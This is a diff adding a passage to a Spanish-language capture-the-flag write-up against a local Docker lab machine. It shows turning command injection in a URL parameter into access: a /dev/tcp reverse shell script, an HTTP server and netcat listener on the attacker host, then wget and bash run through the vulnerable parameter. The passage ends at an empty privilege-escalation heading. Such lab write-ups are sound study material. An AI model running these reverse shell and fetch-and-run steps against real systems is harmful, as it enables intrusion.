@@ -110,3 +110,65 @@ http://172.17.0.2/?cmd=id
 
 
 Tenemos ejecución remota de comandos.
+
+
+Intenté una reverse shell urlencodeandola y no me dejó asi pués:
+
+1- Buscamos si dispone de wget:
+
+![Nmap Scan](images/talent/14.png)
+
+
+2- Creamos un archivo malicioso
+
+```bash
+echo "sh -i >& /dev/tcp/172.17.0.1/4444 0>&1" > reverse.sh
+```
+
+![Nmap Scan](images/talent/15.png)
+
+
+
+3- Levantamos un servidor por el puerto 80
+
+```bash
+sudo python3 -m http.server 80
+```
+
+![Nmap Scan](images/talent/16.png)
+
+4- en otra ventana nos ponemos a la escucha por el puerto 4444
+
+```bash
+sudo nc -nvlp 4444
+```
+
+
+![Nmap Scan](images/talent/17.png)
+
+
+5- en la página web en la URL ejevutamos el siguiente comando: `wget+http://172.17.0.1/reverse.sh` quedando la URL así:
+```bash
+http://172.17.0.2/?cmd=wget+http://172.17.0.1/reverse.sh
+```
+![Nmap Scan](images/talent/wget.png)
+
+6-Al estar descargada, ahora lo ejecutamos con el sigueinte comando `bash+reverse.sh`
+```bash
+http://172.17.0.2/?cmd=bash+reverse.sh
+```
+
+
+
+![Nmap Scan](images/talent/19.png)
+
+
+Resumiendo, creamos un archivo que contiene una reverse shell, montamos un servidor para poder reclamar el archivo con la ejecucion remota de comandos ya que dispone de wget, una vez descargado estando a la escucha por el puerto 4444 ejecutamos con bash el archivo y nos creamos una reverse shell y entramos como www-data.
+
+
+## FASE ESCALADA DE PRIVILEGIOS
+
+
+
+
+
